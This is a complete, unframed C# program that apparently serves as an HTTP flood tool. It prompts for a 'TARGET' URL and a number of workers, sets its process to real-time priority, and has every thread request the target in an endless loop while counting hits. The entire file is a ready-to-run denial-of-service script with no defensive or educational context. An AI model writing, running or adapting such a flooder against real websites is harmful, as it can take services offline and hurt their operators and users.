using System;
using System.Net;
using System.Threading;
using System.Threading.Tasks;
using System.Diagnostics;

namespace MyTasks
{
    public class Program
    {
        static void Main()
        {
            Console.Write("URL name of TARGET (Example https://www.google.com/): ");
            string url = Console.ReadLine();

            Console.Write("Workers count: ");
            int numOfThreads = Convert.ToInt32(Console.ReadLine());

            using (Process p = Process.GetCurrentProcess())
                p.PriorityClass = ProcessPriorityClass.RealTime;

            int count = 0;

            Thread[] threads = new Thread[numOfThreads];

            Parallel.For(0, numOfThreads, (i) =>
            {
                threads[i] =
                new Thread(() =>
                {
                    while (true)
                    {
                        try
                        {
                            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                            ++count;
                            Console.WriteLine(count);
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine(e.Message);
                        }
                    }
                });
            });

            Parallel.ForEach(threads, (i) =>
            {
                i.Start();
            });
        }
    }
}
